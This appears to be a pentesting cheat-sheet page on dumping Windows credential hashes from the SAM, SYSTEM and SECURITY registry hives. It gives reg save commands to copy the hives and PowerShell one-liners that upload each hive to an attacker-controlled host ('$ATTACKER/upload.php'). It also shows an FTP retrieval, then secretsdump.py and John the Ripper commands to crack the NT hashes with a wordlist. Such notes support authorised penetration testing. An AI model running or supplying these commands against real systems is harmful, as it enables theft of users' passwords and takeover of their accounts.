# SAM / SYSTEM / SECURITY

The Windows passwords are stored encrypted in the SAM file \(`C:Windows\System32\config\`\). The SYSTEM file is in the same folder and contains the bootkey to decrypt it.

These two files are locked by the kernel when the operating system is up, so to access the passwords there are a few options:

* mount the disk when the system is down
* use tools to dump the hashes in memory
* get the twin files backed up for recovery at `C:\Windows\Repair`. 

## Dump hashes from memory

```text
reg save hklm\sam sam.save
reg save hklm\security security.save
reg save hklm\system system.save
```

```text
powershell (New-Object System.Net.WebClient).UploadFile('http://$ATTACKER/upload.php','sam.save')
powershell (New-Object System.Net.WebClient).UploadFile('http://$ATTACKER/upload.php','security.save')
powershell (New-Object System.Net.WebClient).UploadFile('http://$ATTACKER/upload.php','system.save')
```

```text
$ ftp $TARGET
ftp> bin
200 Type set to I.

ftp> get sam.save
ftp> get security.save
ftp> get system.save
```

```text
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > dump.hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt dump.hash --format=NT
sudo john --show --format=NT dump.hash
```



